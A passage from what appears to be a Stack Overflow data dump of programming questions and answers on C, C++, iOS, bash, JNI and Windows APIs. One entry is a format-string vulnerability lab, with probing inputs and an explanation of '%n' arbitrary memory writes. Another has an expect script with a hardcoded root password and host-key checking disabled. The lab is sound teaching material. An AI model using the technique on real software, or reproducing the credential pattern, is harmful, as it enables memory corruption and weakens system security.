        messageCounter++;        
    }
    fclose(input);
    fclose(output);
    return 0;
}
</code></pre>
","9530","","<p>You're almost certainly failing to open the input file.  If <code>fopen</code> fails, it returns <code>NULL</code>, and calling <code>fgetc(NULL)</code> has undefined behavior, and a segmentation fault is one possible outcome of undefined behavior.</p>

<p>You need to check for errors and handle then accordingly.  You also need to check if your program was given sufficient arguments.  Here's one way to handle them:</p>

<pre><code>if (argc &lt; 3)
{
    fprintf(stderr, ""Usage: %s input-file output-file\n"", argv[0]);
    exit(1);
}

input = fopen(argv[1],""r"");
if (input == NULL)
{
    fprintf(stderr, ""Error opening input file %s: %s\n"", argv[1], strerror(errno));
    exit(1);
}

output = fopen(argv[2],""w"");
if (output == NULL)
{
    fprintf(stderr, ""Error opening output file %s: %s\n"", argv[2], strerror(errno));
    exit(1);
}
</code></pre>
"
"<p>I'm using the new API for an In-App appstore product view. I'm aware it should only work on IOS 6 and later, however, my app is targeted for ios 5 and later. Now, when you tab on the button that takes you to store, the app will go lemon and freeze on you! </p>

<p><code>SKStoreProductViewController</code></p>

<p>How would I test if this device is able to perform this function? or if this is ios 6 and later?</p>

<p>I'm looking for something similar to ""In-app mail"" which it has a method called <code>CanSendMail</code>, is there such a method for <code>SKStore</code>?</p>

<p><strong>In Addition</strong></p>

<p>I have the framework weakly linked as an <code>Option</code>.</p>

<p><strong>UPADTE</strong></p>

<p>I tried to use this but still not working!! and nothing logs :(</p>

<pre><code>if (error) {
        NSLog(@""Error %@ with User Info %@."", error, [error userInfo]);


    UIAlertView *alert = [[UIAlertView alloc] initWithTitle:@""Error""
                                                    message:@""Your device doesn't support In-App Product View""
                                                   delegate:nil
                                          cancelButtonTitle:@""OK""
                                          otherButtonTitles:nil];
    [alert show];


    } else {
        // Present Store Product View Controller
        [self presentViewController:storeProductViewController animated:YES completion:nil];
    }
}];

}
</code></pre>
","9530","","<p>The general way of testing if a class is available at runtime is to use <a href=""https://developer.apple.com/library/ios/#documentation/cocoa/reference/foundation/miscellaneous/foundation_functions/reference/reference.html"" rel=""nofollow""><code>NSClassFromString</code></a>.  So, you could do something like this:</p>

<pre><code>Class cls = NSClassFromString(@""SKStoreProductViewController"");
if (cls)
{
    // The device is iOS 6.0 or higher, so it's safe to use this class
    SKStoreProductViewController *viewController = [[cls alloc] init];
    ...
}
else
{
    // The device is pre-iOS 6.0; show an error message or have some other
    // reasonable fallback behavior
}
</code></pre>

<p>If the framework you're using is not available in the minimum version of iOS that you're targeting, then you must also make sure that you <strong>weak link</strong> the framework.  As @rmaddy pointed out, you should see the <a href=""https://developer.apple.com/library/ios/#documentation/DeveloperTools/Conceptual/cross_development/Introduction/Introduction.html#//apple_ref/doc/uid/10000163i"" rel=""nofollow"">SDK Compatibility GUide</a> for the full, gory details.</p>
"
"<p>Please help me to solve this.</p>

<p>I have written a bash script as given below. My goal is to get a return value from the expect script which included with bash script.</p>

<p>The script which i made is as given below.</p>

<blockquote>
  <p>#!/bin/bash<br />
  x=$(expect -c '<br />
  spawn ssh -o StrictHostKeyChecking=no root@10.3.2.0<br />
  expect ""<em>d: ""<br />
  send ""qbcrootpass\r""<br />
  expect ""</em>#""<br />
  send ""res=hello\r""<br />
  send ""\$res\r""<br />
  interact<br />
  ')<br />
  echo $x<br /></p>
</blockquote>

<p>But it is not working as I expected !! :(</p>

<p>What modification i need to do ??</p>

<p>Thanks in advance.</p>
","9530","","<p>If you want to get the exit status of the most recently exited foreground pipeline, you should use the <a href=""http://www.gnu.org/software/bash/manual/bashref.html#Special-Parameters"" rel=""nofollow""><code>$?</code> special parameter</a>:</p>

<pre><code>#!/bin/bash
x=$(expect ...)
y=$?
# $x now contains the output from the 'expect' command, and $y contains the
# exit status
</code></pre>
"
"<p>How do I create a directory , whose name starts with -  (eg -ROOT) in bash ?. If we are trying so bash will treat the name as command line argument and we will get the error </p>

<pre><code>mkdir: invalid option -- 'R'
Try `mkdir --help' for more information.
</code></pre>
","9530","","<p>Prefix the directory name with a <code>./</code> to avoid having it interpreted as an option:</p>

<pre><code>mkdir ./-ROOT
</code></pre>

<p>Alternatively, insert the argument <code>--</code> (two dashes), which causes all arguments following it to be interpreted as file names and not as options:</p>

<pre><code>mkdir -- -ROOT
</code></pre>
"
"<p>I'm working on a format-string vulnerability lab, where we're given the following code:  </p>

<pre><code>#define SECRET1 0x44
#define SECRET2 0x55

int main(int argc, char *argv[])
{
  char user_input[100];
  int *secret;
  int int_input;
  int a, b, c, d; /* other variables, not used here.*/

  /* The secret value is stored on the heap */
  secret = (int *) malloc(2*sizeof(int));

  /* getting the secret */
  secret[0] = SECRET1; 
  secret[1] = SECRET2;

  printf(""The variable secret's address is 0x%.8x (on stack)\n"", &amp;secret);
  printf(""The variable secret's value is 0x%.8x (on heap)\n"", secret);
  printf(""secret[0]'s address is 0x%.8x (on heap)\n"", &amp;secret[0]);
  printf(""secret[1]'s address is 0x%.8x (on heap)\n"", &amp;secret[1]);

  printf(""Please enter a decimal integer\n"");
  scanf(""%d"", &amp;int_input);  /* getting an input from user */
  printf(""Please enter a string\n"");
  scanf(""%s"", user_input); /* getting a string from user */

  /* vulnerable place */
  printf(user_input);
  printf(""\n"");

  /* Verify whether your attack is successful */
  printf(""The original secrets: 0x%x -- 0x%x\n"", SECRET1, SECRET2);
  printf(""The new secrets:      0x%x -- 0x%x\n"", secret[0], secret[1]);
  return 0;
  }
</code></pre>

<p>We're not supposed to modify the code at all. Using just the input, we have 4 goals: crash the program, print the value at secret[1], modify the value at secret[1], and modify the value at secret[1] to a pre-determined value.</p>

<p>Sample output I get is:</p>

<pre><code>The variable secret's address is 0xbfffe7cc (on stack)
The variable secret's value is -x0804a008 (on heap)
secret[0]'s address is 0x0804a008 (on heap)
secret[1]'s address is 0x0804a00c (on heap)
Please enter a decimal integer
65535
Please enter a string
%08x.%08x.%08x.%08x.%08x.%08x.%08x%08x.
bfffe7d0.00000000.00000000.00000000.00000000.0000ffff.0804a008.78383025
</code></pre>

<p>So, by entering 8 ""%08x""s, I print the address of secret + 4, then I print the addresses of ints a, b, c, and d - but as I never gave them a value, they don't point anywhere and just  display 0's. Following that is the decimal I input, chosen so that the 'ffff' would be clearly visible. Next comes the address of secret[0], then I get into other values stored in the program. </p>

<p>If I were to input <code>AAAA.%08x.%08x.%08x.%08x.%08x.%08x.%08x%08x.</code>, after the .0804a008 would be .41414141, because the A's from the string input would be stored there. </p>

<p>It's pretty easy to crash the program: enough %s on the string input causes a segfault. Now I need to read the value at secret[1], though, and I'm totally lost. I tried trying to put the address on the stack somehow, by putting it at the start of the string like so: <code>\xd0\xe7\xff\xbf_%08x.%08x.%08x.%08x.%08x.%08x.%s</code>, but the address isn't getting pushed anywhere and I just print secret[0] (which, for the curious, is 'D'). I've tried all sorts of address, but after a while I realized I was just storing all of them as a string where those A's showed up previously. They're not being converted to hex or anything.</p>

<p>I've seen a lot of discussion about this code on SA and other places, but I've yet to see anyone talk about how you get the values at secret[1]. </p>

<p>Any help would be greatly appreciated.</p>
","9530","","<p>The trick is to use the <code>%n</code> specifier in the user-specified format string.  <code>%n</code> says to take the number of bytes written so far and <em>store them at the address pointed to by the next argument</em>.  When you don't supply enough arguments to <code>printf</code>, then the address that it writes to is whatever value happens to be next on the stack.  If you can exploit that address to be what you want, then you can essentially write a 4-byte integer anywhere in memory.</p>

<pre><code>// Normal usage: count receives the value 14, since 14 bytes were written when
// the %n was encountered
int count;
printf(""Hello, world!\n%n"", &amp;count);

// UNDEFINED BEHAVIOR: The value 14 will get written to some unknown location in
// memory 
printf(""Hello, world!\n%n"");
</code></pre>
"
"<p>The <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/dd371073%28v=vs.85%29.aspx"" rel=""nofollow"">Direct2D</a> system library provides 4 overloaded versions for the <code>D2D1CreateFactory</code> function. Now suppose I'm loading the Direct2D library dynamically, and obtain the pointer to the CreateFactory function using the <code>GetProcAddress</code> system call. Which of the 4 overloaded functions will be returned? Is there a way to specify explicitly which function I need? Is this a downside of dynamic loading versus static linking, in that some of the overloaded functions will not be accessible?</p>

<pre><code>HMODULE hDllD2D = ::LoadLibraryExA(""d2d1.dll"", 0, LOAD_LIBRARY_SEARCH_SYSTEM32);
FARPROC fnCreateFactory = ::GetProcAddress(hDllD2D, ""D2D1CreateFactory"");
// What should be the call signature of `fnCreateFactory` ?
</code></pre>
","9530","","<p>The function in the DLL is the most general one, <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/dd368034%28v=vs.85%29.aspx""><code>D2D1CreateFactory(D2D1_FACTORY_TYPE,REFIID,D2D1_FACTORY_OPTIONS*,void**) function</code></a>.  If you peek inside the declarations in <code>d2d1.h</code>, you'll see that that function is declared, whereas the other overloads are just inline functions in the header which call through to the general function:</p>

<pre><code>#ifndef D2D_USE_C_DEFINITIONS

inline
HRESULT
D2D1CreateFactory(
    __in D2D1_FACTORY_TYPE factoryType,
    __in REFIID riid,
    __out void **factory
    )
{
    return 
        D2D1CreateFactory(
            factoryType,
            riid,
            NULL,
            factory);
}


template&lt;class Factory&gt;
HRESULT
D2D1CreateFactory(
    __in D2D1_FACTORY_TYPE factoryType,
    __out Factory **factory
    )
{
    return
        D2D1CreateFactory(
            factoryType,
            __uuidof(Factory),
            reinterpret_cast&lt;void **&gt;(factory));
}

template&lt;class Factory&gt;
HRESULT
D2D1CreateFactory(
    __in D2D1_FACTORY_TYPE factoryType,
    __in CONST D2D1_FACTORY_OPTIONS &amp;factoryOptions,
    __out Factory **ppFactory
    )
{
    return
        D2D1CreateFactory(
            factoryType,            
            __uuidof(Factory),
            &amp;factoryOptions,
            reinterpret_cast&lt;void **&gt;(ppFactory));
}

#endif // #ifndef D2D_USE_C_DEFINITIONS
</code></pre>
"
"<p>I have some useful code in constructor or class <code>Valuable</code>. I want be sure it's executed before <code>submain</code>. How can I guarantee that it's not optimized out?</p>

<pre><code>int main()
{
    // Dear compiler, please don't optimize ctor call out!
    Valuable var;

    return submain();
}
</code></pre>

<p>Is local variable enough? Do I need to use <code>static</code>:</p>

<pre><code>static Valuable *v = new Valuable();
delete v;
v = NULL;
</code></pre>

<p>Can I shorten previous to one liner:</p>

<pre><code>delete new Valuable();
</code></pre>
","9530","","<p>If your constructor or destructor has observable behavior, the compiler is <strong>not allowed</strong> to optimize it out.  So there's no need to do anything tricky.</p>
"
"<p>I have an ip address like so:</p>

<pre><code>address = '192.168.1.11';
</code></pre>

<p>and need to convert it to its binary format</p>

<pre><code>11000000 10101000 00000001 00001011
</code></pre>

<p>I have some ideas on how to leftshift the decimal number and using inet_addr, but not sure how I would go about doing it.</p>

<p>Thanks, I'm still new to C.</p>
","9530","","<p>You can use the <a href=""http://linux.die.net/man/3/inet_addr"" rel=""nofollow""><code>inet_addr(3)</code></a> function to convert the string into an <code>in_addr_t</code>, and then convert that to binary.  There's no standard library function to convert a number to binary, but it's pretty straightforward to do yourself using the bitwise logical operators.</p>
"
"<p>In python how would I format the date as 1/1/1990?</p>

<blockquote>
  <p>dayToday = datetime.date(1990,1,1)
  print dayToday</p>
</blockquote>

<p>This returns 1990-01-01, but I want it to look like 1/1/1990. (Jan 1 1990)</p>
","9530","","<p>Use the <a href=""http://docs.python.org/2/library/datetime.html#datetime.datetime.strftime"" rel=""nofollow""><code>datetime.strftime</code></a> function with an appropriate <a href=""http://docs.python.org/2/library/datetime.html#strftime-strptime-behavior"" rel=""nofollow"">format string</a>:</p>

<pre><code>&gt;&gt;&gt; now = datetime.datetime.now()
&gt;&gt;&gt; print now.strftime('%Y/%m/%d')
2013/04/19
</code></pre>
"
"<p>I am building a server that communicates through FIFO with it's clients.</p>

<p>So far I've managed to create a FIFO, run a new thread, once a message arrives in the FIFO and output the message from the thread.</p>

<p>The problem is that as soon as the client writes something in the pipe, the server just prints the message endlessly (I am reading from the pipe in a <code>while(1)</code>).</p>

<p>My question is: shouldn't the <code>read</code> operation also remove the message from the pipe, so it doesn't get read again? Isn't that the point of First In, First <strong>Out</strong>? Is that something I have to do manually?</p>

<p>Here's my code too, if that helps: <a href=""http://pastebin.com/Ag7vgrav"" rel=""nofollow"">http://pastebin.com/Ag7vgrav</a><br/>
What I do to write in the FIFO is just: <code>echo test &gt; /home/ubuntu/work/my_fifo</code></p>
","9530","","<p>You need to check the return code from <code>read(2)</code>.  If it returns -1, an error occurred, and you should stop reading immediately.  If it returns 0, that's EOF, meaning the writer closed its end of the FIFO and you should also stop writing and close your end of the FIFO.</p>

<p>In order to support multiple clients, you need to reopen the FIFO every time you accept a new client.</p>

<p>You also have some undefined behavior in the way you're managing the child thread.  There's no guarantee that the thread will start up before the end of the current iteration of the <code>while</code> loop in <code>main()</code>, at which point the <code>thread_arg</code> instance goes out of scope.  In order to ensure that the thread can still access that data while it's still valid, you need to either make it global data (if you only have one child thread), or allocate it dynamically on the heap.  The usual pattern for that is this:</p>

<pre><code>// Parent thread:
thread_arg *arg = malloc(sizeof(*arg));
...
pthread_create(..., &amp;thread_proc, arg);

void *thread_proc(void *t_arg)
{
    thread_arg *arg = t_arg;

    // Thread code goes here
    ...
    free(arg);
    return exit_status;
}
</code></pre>
"
"<p>In my C++ project ,when i declare a global variable in my header file,i get LNK2005(x is already defined in y.obj) and LNK1169(one or more multiply defined symbols found z.exe) errors in visual studio 2012,but when i declare the global variable with const identifier,i do not get an error.From my research in msdn i understand that it is because of project properties.But i can not fix them with properties.It is only fixed with const identifier.But i can not find any rules about it in C++.is it a new feature in C++11???</p>
","9530","","<p>This is a <strong>declaration</strong> of a global variable:</p>

<pre><code>extern int my_global;
</code></pre>

<p>Thie is a <strong>definition</strong> of a global variable:</p>

<pre><code>int my_global;
</code></pre>

<p>A <em>declaration</em> of a global variable says ""here is the name of an object"".  A <em>definition</em> says ""here is the name of an object, and please allocate storage space for it"".</p>

<p>You can have as many declarations of a global variable as you want (so that anyone in any source file can refer to that same object), but you can only have one definition, since the object can only exist in one place in memory when the program runs.</p>

<p>The linker is complaining that you have multiple definitions of the same object because you're putting a <em>definition</em> in the header file, and that header gets included in multiple source files.  So when, those source files get compiled, you get multiple definitions, and the linker can't do that.</p>

<p>The solution is to put <em>only a declaration</em> in the header file, and then put the definition in <em>exactly one source file</em>.  For example:</p>

<pre><code>// MyVariables.h
extern int my_global;

// MyVariables.cpp
int my_global = 42;
</code></pre>

<p>The reason you're seeing different behavior with the <code>const</code> keyword is because the <code>const</code> gives global variables <em>internal linkage</em>, meaning they're not visible to other source files.  In effect, these means that each source file that includes your header gets its own copy of the constant.  This takes up a little more memory, but it's not going to be noticeable.  And since it's a constant, nobody's going to notice that the different constants refer to different locations in memory.</p>

<p>C++11 did not change any of this behavior.  These constructs all behaved the same way in previous versions of C++.</p>
"
"<p>I know this question has been asked alot, but I'm still unclear how to access the structs.</p>

<p>Goal: I want to make a global pointer to an array of structs.</p>

<pre><code>typdef struct test{
int obj1;
int obj2;
 } test_t;

extern test_t array_t1[1024];
extern test_t array_t2[1024];
extern test_t array_t3[1025];

extern test_t * test_array_ptr;



function{
test_array_ptr = array_t1;

test_t new_struct = {0,0};
(*test_array_ptr)[0] = new_struct;
}
</code></pre>

<p>but it gives me warnings. How would I access the specific structs with []?</p>

<p>similiar how would I create an array of pointers of struct type?
     test_t * _array_ptr[2]; //??</p>
","9530","","<p>The syntax you are looking for is somewhat cumbersome, but it looks like this:</p>

<pre><code>// Declare test_array_ptr as pointer to array of test_t
test_t (*test_array_ptr)[];
</code></pre>

<p>You can then use it like so:</p>

<pre><code>test_array_ptr = &amp;array_t1;
(*test_array_ptr)[0] = new_struct;
</code></pre>

<p>To make the syntax easier to understand, you can use a <code>typedef</code>:</p>

<pre><code>// Declare test_array as typedef of ""array of test_t""
typedef test_t test_array[];
...
// Declare test_array_ptr as pointer to test_array
test_array *test_array_ptr = &amp;array_t1;
(*test_array_ptr)[0] = new_struct;
</code></pre>

<p>The <a href=""http://www.cdecl.org/"">cdecl</a> utility is useful for deciphering complex C declarations, especially when arrays and function pointers get involved.</p>
"
"<p>I have an .so library, and run <code>nm -gC</code> on it.</p>

<p>I see an output like this:</p>

<pre><code>0011a011 W void my_fun&lt; unsigned char&gt;(unsigned char*, unsigned char, int)
</code></pre>

<p>None of the headers that I can include contain this function, but I'd like to call it from my cpp file.</p>

<p>How would I go about doing it?</p>
","9530","","<ol>
<li>Load the library with <a href=""http://linux.die.net/man/3/dlopen"" rel=""nofollow""><code>dlopen(3)</code></a></li>
<li>Get the function's address with <a href=""http://linux.die.net/man/3/dlopen"" rel=""nofollow""><code>dlsym(3)</code></a>, and cast it to a function pointer of the appropriate type</li>
<li>Call the function</li>
<li>When you're all done, close the library with <a href=""http://linux.die.net/man/3/dlopen"" rel=""nofollow""><code>dlclose(3)</code></a></li>
</ol>
"
"<p>I' m creating a handle to file for delete on close, with permission for read.
I need without close the handle (because it will deleted the file) create a process that can read the file.</p>

<p>This is my implementation: I create a file, and without close I try open the file with notepad, but it not can. How I can solve this. I imagine that I can be something in the parameters of CreateProcess, but I don't have idea.</p>

<p>Please help.</p>

<pre><code>#include &lt;windows.h&gt;

int main(int argc, char * argv[])
{
    PROCESS_INFORMATION pi;
    STARTUPINFO si;
    HANDLE hFile;
    TCHAR text[] = ""This is a text"";
    DWORD dwWrited;

    hFile = CreateFile(
    ""data.txt"",
    GENERIC_WRITE,
    FILE_SHARE_READ,
    NULL,
    CREATE_ALWAYS,
    FILE_FLAG_DELETE_ON_CLOSE
    ,NULL
    );

    WriteFile(hFile, text, sizeof(text), &amp;dwWrited, NULL);
    FlushFileBuffers(hFile);

    memset(&amp;pi, 0, sizeof(pi));
    memset(&amp;si, 0, sizeof(si));
    CCreateProcess(TEXT(""C:\\Windows\\System32\\Cmd.exe""),
              TEXT(""/C \""Notepad.exe data.txt\""""),
              NULL, NULL, FALSE, 
              NORMAL_PRIORITY_CLASS, NULL, NULL, &amp;si, &amp;pi);


    puts(""Press a key for close the file"");
    getchar();
    CloseHandle(hFile);

    return 0;
}
</code></pre>
","9530","","<p><a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/aa363858%28v=vs.85%29.aspx"" rel=""nofollow"">The documentation</a> for the <code>FILE_FLAG_DELETE_ON_CLOSE</code> flag says:</p>

<blockquote>
  <p>If there are existing open handles to a file, the call fails unless they were all opened with the <code>FILE_SHARE_DELETE</code> share mode.</p>
  
  <p>Subsequent open requests for the file fail, unless the <code>FILE_SHARE_DELET</code>E share mode is specified.</p>
</blockquote>

<p>Notepad does not open the file with <code>FILE_SHARE_DELETE</code>, so it fails to open the file with <code>ERROR_SHARING_VIOLATION</code> (""The process cannot access the file because it is being used by another process."").</p>

<p>Since you cannot rewrite Notepad, the only way to solve your problem is to not use the <code>FILE_FLAG_DELETE_ON_CLOSE</code> flag, or use a different program besides Notepad which opens the file with the <code>FILE_SHARE_DELETE</code> share mode.</p>
"
"<p>My <strong>Java</strong> application needs to call <strong>Cpp</strong> library with <strong>input</strong> values to do calculation and then pass <strong>result</strong> back.</p>

<p>Because there are several <strong>input</strong> data: a <code>short[]</code>, few <code>int</code>s and <code>float</code>s, and the <strong>output</strong> contains two <strong><code>short[]</code></strong>, few <code>ints</code> and <code>float</code>s, I am think passing two Java objects, <code>inputObject</code> and <code>outputObject</code> to Cpp side. In Cpp side I call those <code>getXXX()</code> methods and <code>setXXX()</code> methods to get the input and get the output.</p>

<p>I know I need to <code>getMethodID</code> in Cpp side to call those <strong>get</strong> and <strong>set</strong> methods. But I cannot find any <code>CallShortArray()</code> available, like <code>CallIntMethod()</code> is for int.</p>

<p>Is there a way to do?</p>

<p>I can pass <strong>individual</strong> input parameters without above <code>inputObject</code> to get around the input data part. But for the ouput short[]s, I cannot find a way to do it without that <code>outputObject</code>.</p>

<p>Another question is about the <strong>last</strong> parameter of the <strong>getMethodID</strong> method. Is there document to tell me those <strong>signature string</strong> for <strong>different</strong> methods?</p>
","9530","","<p>An array is just an object.  So if you have a function which returns a <code>short[]</code>, you call it with <code>CallObjectMethod()</code> and get the result as a <code>jobject</code>, which you can then cast to a <code>jshortarray</code>.</p>

<p>For a description of how the last parameter (<code>sig</code>) to <code>GetMethodID()</code> works, see the description of <a href=""http://docs.oracle.com/javase/1.5.0/docs/guide/jni/spec/types.html#wp276"" rel=""nofollow"">Type Signatures</a>.  You need to determine the type signature of each of the method's parameters and of its return value, then put them together appropriately.  For example, this method:</p>

<pre><code>long f (int n, String s, int[] arr); 
</code></pre>

<p>It has three arguments, which have these type signatures according to the table in the link above:</p>

<pre><code>I                     (int)
Ljava/lang/String;    (java.lang.String)
[I                    (int[])
</code></pre>

<p>And it has a return type signature of <code>J</code> (for <code>long</code>).  So, putting that all together with the <code>""("" arg-types "")"" ret-type</code> template, we can determine that the full signature is this:</p>

<pre><code>(ILjava/lang/String;[I)J
</code></pre>
"
"<p>I would like to do the following:</p>

<ol>
<li>Non-admin users can run my program without UAC prompt.</li>
<li>The program have full access to a particular file.</li>
<li>Outside of the program, the user have read-only or no access to the file. They cannot modify the file. They can only modify it through the program.</li>
</ol>

<p>Is it possible?</p>
","9530","","<p><a href=""http://blogs.msdn.com/b/oldnewthing/archive/2006/08/18/705957.aspx"" rel=""nofollow"">Applications don't have privileges, users do</a>.  The conditions ""the program has full access to a particular file"" and ""the user has full access to a particular file"" are indistinguishable, since a program runs with identical privileges as the user who started it.</p>

<p>So, in order for a program to run with higher privileges, it needs to run as a different user.  You can do that by <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/bb756929.aspx"" rel=""nofollow"">embedding an application manifest</a> in your executable.  Of course, then when you run it, you'll get a UAC prompt, and <a href=""http://blogs.msdn.com/b/windowsvistasecurity/archive/2007/08/09/faq-why-can-t-i-bypass-the-uac-prompt.aspx"" rel=""nofollow"">that cannot be bypassed</a>.</p>
"
"<p>So I have a class called HPStack and I have to include it in my main class etc. However I get a ""In File included from"" error, what could be causing this? </p>

<p>Also my string objects also have errors I have have no idea why, the error is: ""Unable to identifier string"".</p>

<p>I'm new the C++ so any help would be appreciated, thanks in advance. </p>

<p>The error I am getting (I think) are these:</p>

<pre><code>error: expected unqualified-id before ""namespace""
error: expected `,' or `;' before ""namespace""
error: expected namespace-name before ';' token
error: `&lt;type error&gt;' is not a namespace
</code></pre>

<p>Im not sure what I am missing but that isn't telling me much. </p>

<p>Here is my code: The class.h file.</p>

<pre><code>#ifndef HPSTACK_H
#define HPSTACK_H

class HPStack {
public:
    HPStack();



    void push(double);
    double pop();
    double peek();



private:
    double register_[4];

}

#endif 
</code></pre>

<p>The class.cpp file.</p>

<pre><code>#include ""HPStack.h""
#include &lt;cstdlib&gt;



HPStack::HPStack() : register_{}{
}

double HPStack::push(double x) {

    for (int i = 2; i &gt;= 0; i--) {
        if (isdigit(register_[i])) {

            register_[i] = register_[i + 1];
        }
        register_[0] = x;
    }
}

double HPStack::pop() {

    return register_[0];

    for (int i = 0; i &lt; 3; i++) {
        register_[i] = register_[i + 1];
    }
}

double HPStack::peek() {

    return register_[0];
}
</code></pre>

<p>And my main file:</p>

<pre><code>#include ""HPStack.h""
#include &lt;cstdlib&gt;
#include &lt;string&gt;
#include &lt;sstream&gt;
#include &lt;iostream&gt;


using namespace std;

int main() {

    HPStack stack;
    string line;

    while (getline(cin, line)) {
        stringstream expression(line);
        string token;
        while (expression &gt;&gt; token) {
            if (isdigit(token[0])) {
                stack.push(atof(token.data()));
            } else if (token == ""+"") {
                double x = stack.pop();
                double y = stack.pop();
                double z = (y + x);
                stack.push(z);
            }
        }
        cout &lt;&lt; stack.peek();
    }
</code></pre>
","9530","","<p>You're missing the <code>;</code> at the end of the class definition:</p>

<pre><code>class HPStack {
    ...
};  // &lt;== This semicolon is required
</code></pre>
"
"<p>I'm trying to use socket.io to connect to a streaming server hosted by <a href=""https://community.geoloqi.com/discussion/75/viewing-real-time-group-location-in-a-map-using-ios-sdk/p1"" rel=""nofollow"" title=""Geoloqi"">Geoloqi</a></p>

<p>I grabbed the Gottox socket.io-java-client code straight from github and didn't make any modifications, except to change the url, but it's giving me the ""Error while handshaking"" message. The url should work as I got it from the makers of Geoloqi: <a href=""https://community.geoloqi.com/discussion/19/data-streaming#Item_11"" rel=""nofollow"">https://community.geoloqi.com/discussion/19/data-streaming#Item_11</a> (see the 1st response).</p>

<p>Here is the code, from BasicExample.java</p>

<pre><code>package basic;
/*
 * socket.io-java-client Test.java
 *
 * Copyright (c) 2012, Enno Boland
 * socket.io-java-client is a implementation of the socket.io protocol in Java.
 * 
 * See LICENSE file for more information
 */
import io.socket.IOAcknowledge;
import io.socket.IOCallback;
import io.socket.SocketIO;
import io.socket.SocketIOException;

import org.json.JSONException;
import org.json.JSONObject;

public class BasicExample implements IOCallback {
    private SocketIO socket;

    /**
     * @param args
     */
    public static void main(String[] args) {
        try {
            new BasicExample();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public BasicExample() throws Exception {
        socket = new SocketIO();
//      socket.connect(""http://localhost:8080/"", this);
        socket.connect(""https://subscribe.geoloqi.com:443"", this);

        // Sends a string to the server.
        socket.send(""Hello Server"");

        // Sends a JSON object to the server.
        socket.send(new JSONObject().put(""key"", ""value"").put(""key2"",
                ""another value""));

        // Emits an event to the server.
        socket.emit(""event"", ""argument1"", ""argument2"", 13.37);
    }

    @Override
    public void onMessage(JSONObject json, IOAcknowledge ack) {
        try {
            System.out.println(""Server said:"" + json.toString(2));
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onMessage(String data, IOAcknowledge ack) {
        System.out.println(""Server said: "" + data);
    }

    @Override
    public void onError(SocketIOException socketIOException) {
        System.out.println(""an Error occured"");
        socketIOException.printStackTrace();
    }

    @Override
    public void onDisconnect() {
        System.out.println(""Connection terminated."");
    }

    @Override
    public void onConnect() {
        System.out.println(""Connection established"");
    }

    @Override
    public void on(String event, IOAcknowledge ack, Object... args) {
        System.out.println(""Server triggered event '"" + event + ""'"");
    }
}
</code></pre>

<p>Here is the error message:</p>

<pre><code>an Error occured
io.socket.SocketIOException: Error while handshaking
    at io.socket.IOConnection.handshake(IOConnection.java:322)
    at io.socket.IOConnection.access$7(IOConnection.java:292)
    at io.socket.IOConnection$ConnectThread.run(IOConnection.java:199)
Caused by: java.lang.NullPointerException
    at io.socket.IOConnection.handshake(IOConnection.java:302)
    ... 2 more
May 1, 2013 10:02:49 PM io.socket.IOConnection cleanup
INFO: Cleanup
</code></pre>

<p>What's going wrong with the code?</p>
","9530","","<p>Looking at the <a href=""https://github.com/Gottox/socket.io-java-client/blob/master/src/io/socket/IOConnection.java"">source code</a> where the exception is coming from (<code>IOConnection.java:302</code>, from the inner <code>NullPointerException</code>), there's this block of code:</p>

<pre><code>if (connection instanceof HttpsURLConnection) {
    ((HttpsURLConnection) connection)
        .setSSLSocketFactory(sslContext.getSocketFactory());
}
</code></pre>

<p>Clearly <code>connection</code> must be non-null, otherwise it wouldn't pass the <code>instanceof</code> test.  Therefore, <code>sslContext</code> must be null.  Since the only other places in that file that <code>sslContext</code> is referenced is in <code>setSslContext()</code> and <code>getSslContext()</code>, the only logical conclusion is that <strong>you must call <code>setSslContext()</code> prior to making an SSL connection</strong>.  <code>SocketIO.setDefaultSSLSocketFactory()</code> also calls through to <code>IOConnection.setSslContext()</code>, so you can call that too instead.</p>

<p>Try this:</p>

<pre><code>SocketIO.setDefaultSSLSocketFactory(SSLContext.getDefault());
socket = new SocketIO();
socket.connect(""https://subscribe.geoloqi.com:443"", this);
...
</code></pre>
"
"<p>I have a function that will generate a unique random number(basically increment previous) to different threads invoking it.</p>

<p>Is this thread safe or is this reentrant.Assume I used static variable for this number.</p>

<p>I have seen in this forum static variables cant be used for reentrant/thread safe.</p>

<p>Does it applies for local/global static.</p>

<p>Or is it implementation defined.</p>
","9530","","<p>In C, local <code>static</code> variables are initialized in a thread-safe manner because they're always initialized at program startup, before any threads can be created.  It is not allowed to initialize local <code>static</code> variables with non-constant values for precisely that reason.</p>

<pre><code>void some_function(int arg)
{
    // This initialization is thread-safe and reentrant, since it happens at
    // program startup
    static int my_static = 42;

    // ERROR: Initializer is not constant
    static int another_static = arg;
    ...
}
</code></pre>

<p>Of course, whether or not the entire function is thread-safe or reentrant depends entirely on how you <em>use</em> the static variables.  Since they're effectively identical to global variables, you need to make sure to use proper mutexes when reading or writing them (or other synchronization structures) to ensure thread safety.</p>

<p>In order to ensure that the function is reentrant, you need to carefully examine when and how the function can call itself (perhaps indirectly via another function) and make sure that all global state behaves consistently.</p>
"
"<p>I got an error while compiling my code.  The issue identifier labels it as 'Apple Mach-O Link Linker command failed'.  I have no clue what this is so I have not been able to find a solution.</p>

<pre><code>duplicate symbol _OBJC_METACLASS_$_XYZFlipsideViewController in:
    /Users/studentuse/Library/Developer/Xcode/DerivedData/RSC-      
aardgrngtzicssfffcbdqsezpqmv/Build/Intermediates/RSC.build/Debug-    
iphonesimulator/RSC.build/Objects-normal/i386/XYZAppDelegate.o
    /Users/studentuse/Library/Developer/Xcode/DerivedData/RSC-  
aardgrngtzicssfffcbdqsezpqmv/Build/Intermediates/RSC.build/Debug-
iphonesimulator/RSC.build/Objects-normal/i386/XYZFlipsideViewController.o
ld: 6 duplicate symbols for architecture i386
clang: error: linker command failed with exit code 1 (use -v to see invocation) //This    
line has the mistake
</code></pre>

<p>What is the problem with the code?</p>

<p>(This is only part of the code.)</p>
","9530","","<p>The problem is that <strong>you have defined the implementation of the class <code>XYZFlipsideViewController</code> twice</strong>, and the linker can't figure out which definition you meant:</p>

<pre><code>duplicate symbol _OBJC_METACLASS_$_XYZFlipsideViewController
</code></pre>

<p>The two places it is defined in are these two object files:</p>

<pre><code>XYZAppDelegate.o
XYZFlipsideViewController.o
</code></pre>

<p>There are two possible explanations:</p>

<ul>
